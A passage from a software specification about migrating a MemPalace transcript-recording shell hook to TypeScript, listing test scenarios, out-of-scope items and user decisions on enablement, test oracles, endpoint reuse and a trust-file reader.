When the `windows-latest` timing step runs case (a) of requirement 19
Then the job fails, naming `hooks/mempalace-transcript.ts`, the case, 750 ms
and the measured time.

**Scenario:** The oracle is re-hosted before the hook migrates

Given the preparatory pull request of requirement 32
When `scripts/tests/test-mempalace-transcript-hook.sh` runs against the
unchanged shell hook, and later against the TypeScript hook through the shim
Then it passes both times with the same cases and expected outcomes.

## Out of scope

- `hooks/worktree-git-guard.sh`, `scripts/worktree-claim.sh` and the guard
  entries of the four manifests: row C2 (#1328).
- Migrating `scripts/setup-*-interactive.sh`, `scripts/lib/tls-delegation.sh`,
  `scripts/lib/tls-exec.sh`, `scripts/lib/usage-capture-optin.sh` or
  `scripts/lib/common.sh`, and changing the format of `tls-env.sh`: row F1
  (#1335) and row J4. These files change here only where the rewiring needs it.
- Migrating `scripts/tests/test-mempalace-transcript-hook.sh` or any other
  Bash suite to TypeScript: row J1a (#1340) and J1b (#1341).
- Deleting the installed copies of the shell hook under the CLIs' own
  directories; requirement 25 reports them.
- Dropping the `PostToolUse` registration from the Claude Code manifest, or
  changing which events each CLI registers; the hook's guard keeps that event
  cheap.
- Changing what is recorded: entry types, content templates, the wing, the
  room scheme, the `added_by` value, the classification of events that carry no
  `hook_event_name` (such as Copilot CLI's), and the MemPalace tool contract.
- Writing or rotating the daemon token, and changing the daemon, its endpoint
  defaults or `scripts/lib/usage-store/mcp.js`'s own request behaviour.
- The `MEMPALACE_TRANSCRIPT_ENABLED` and `MEMPALACE_PYTHON` entries setup
  writes into Claude Code's `env` block; they stay as they are.
- Using a trust value for the hook's own request, which is plain HTTP to the
  daemon.
- Windows service management (row D), the symbolic-link fallback (row E), and
  re-measuring rows 37–37f.
- Making the hook work when `node` is missing or older than 24 when it fires,
  beyond the shim's message (requirement 2) and the documentation of
  requirement 34.

## Open questions

None. The user decided the following on 2026-10-05, at the MINIMAL-mode
interview relayed by the orchestrator. They are recorded here so each one reads
as a decision, with the alternatives it rejected.

- **Q1 — Enablement of the direct form (requirement 4).** No direct form can
  carry `MEMPALACE_TRANSCRIPT_ENABLED=1` on Windows (row 37c). Decided by the
  user on 2026-10-05: the CLI-identifier argument stands for consent; the
  variable set to a non-empty value other than `1` still disables recording;
  the legacy shapes stay gated on `1`. Rejected: ignoring the variable in the
  direct form; a state file under `~/.crewrig/`; keeping the variable as the
  sole gate with a parity gap for Gemini CLI, Copilot CLI and Antigravity CLI
  on Windows.
- **Q2 — Oracle for the hook's own suite (requirement 32).** The suite observes
  the hook through a `curl` stub that the TypeScript hook can never call.
  Decided by the user on 2026-10-05: a preparatory pull request of this ticket
  moves the observation to a loopback stub daemon and proves it against the
  shell hook; the implementation PR leaves the suite unchanged; the three
  source-text assertions go under the second exception of parent requirement
  13 and are replaced by TypeScript tests; no delta of spec 0215. Rejected: a
  delta of spec 0215 adding a third exception to requirement 13; migrating the
  suite here.
- **Q3 — Single definition of endpoint and token path (requirements 13 and
  14).** Decided by the user on 2026-10-05: reuse `endpoint()` and
  `tokenPath()` of `scripts/lib/usage-store/mcp.js`, which already port
  `common.sh` and are checked against it, with a variant that creates no
  directory; the hook keeps its own request, its 5-second bound and its status
  codes 3 and 4. Rejected: reusing `call()` too (a 2-second bound and other
  failure classes); a new `scripts/lib/mempalace-daemon.ts` porting `common.sh`
  a second time.
- **Q4 — The trust file reader (requirement 16).** The hook's only request is
  plain HTTP, so the file changes only the environment of the Git process it
  spawns. Decided by the user on 2026-10-05: build the reader here,
  all-or-nothing on a malformed file with one line on standard error, as the
  contract row F1 inherits. Rejected: dropping the trust file from the hook and
  leaving the reader to F1; applying the lines that parse and skipping the
  rest.
- **Superseded install requirements (requirement 21).** Requirement 21 ends the
  install of a copy under each CLI's directory and the enabling prefix, which
  spec 0116 requirements 13 and 14 (Antigravity CLI) and spec 0169
  requirement 1 (all four setups) require. Decided by the user on 2026-10-05:
  this spec records the supersession, for this hook, as spec 0243 records its
  deviations from spec 0211, and no delta of spec 0116 or spec 0169 is opened.
  The reason is parent requirement 3, which runs every migrated script from
  inside a cloned repository.
- **Descriptor fields (requirement 28).** `scripts/lib/hook-descriptor.ts` has
  no field for an argument-less legacy command, for an environment prefix the
  framework owns and drops, or for a rewrite that targets the running checkout
  whatever path the command names; no C1 descriptor carries any of the three.
  Back-fill responsibility: this ticket's implementation PR adds them as
  optional fields under requirement 28, leaving `USAGE_CAPTURE` and
  `ANTIGRAVITY_STATUSLINE` unchanged, so no delta of spec 0243 is needed.
